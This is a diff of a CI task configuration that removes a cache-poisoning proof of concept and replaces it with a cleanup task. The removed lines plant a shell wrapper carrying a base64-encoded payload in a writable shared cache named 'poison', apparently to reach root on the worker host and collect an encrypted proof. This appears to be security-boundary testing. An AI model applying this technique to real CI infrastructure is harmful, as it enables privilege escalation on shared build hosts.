@@ -10,52 +10,23 @@ task-defaults:
   worker-type: t-linux-native-proof
   always-target: true
   worker:
-    max-run-time: 120
+    max-run-time: 60
     mounts:
-      - cache-name: gw-cache-boundary-proof
-        directory: poison
+      - cache-name: gw-cache-boundary-proof-58b1806ddfc0
+        directory: poison-cleanup
   run:
     using: run-task
     checkout: false
     use-caches: false
 
 tasks:
-  cache-poison-prep:
-    description: Persist a regular-file writable-cache entry for the boundary test
-    run:
-      command: |-
-        set +x
-        original_b64="$(/usr/bin/base64 -w 0 /bin/chown)"
-        original_sha="$(/usr/bin/sha256sum /bin/chown | /usr/bin/cut -d ' ' -f 1)"
-        wrapper=poison-wrapper
-        {
-          printf '%s\n' '#!/bin/sh'
-          printf "ORIGINAL_CHOWN_B64='%s'\n" "$original_b64"
-          printf "ORIGINAL_CHOWN_SHA256='%s'\n" "$original_sha"
-          printf "PROOF_CERT_B64='%s'\n" "$PROOF_CERT_B64"
-          printf '%s' "$WRAPPER_BODY_B64" | /usr/bin/base64 --decode
-        } >"$wrapper"
-        /bin/chmod 0755 "$wrapper"
-        /bin/rm -rf poison
-        /bin/mv "$wrapper" poison
-
-  cache-root-proof:
-    description: Collect an encrypted root-boundary proof and atomically restore the host binary
-    dependencies:
-      prep: cache-boundary-cache-poison-prep
+  cache-cleanup:
+    description: Remove the prior cache-boundary test entry from the worker
     worker:
-      artifacts:
-        - type: file
-          name: public/cache-boundary-proof.cms
-          path: proof.cms
+      purge-caches-exit-status:
+        - 0
     run:
       command: |-
         set +x
-        proof_src="/tmp/gw-cache-boundary-${USER}.cms"
-        if [ -s "$proof_src" ]; then
-          /bin/cp "$proof_src" proof.cms
-        else
-          printf '%s\n' 'Encrypted proof was not produced; this task did not hit the prepared worker.' >proof.cms
-        fi
+        /bin/rm -f poison-cleanup
         exit 0
-
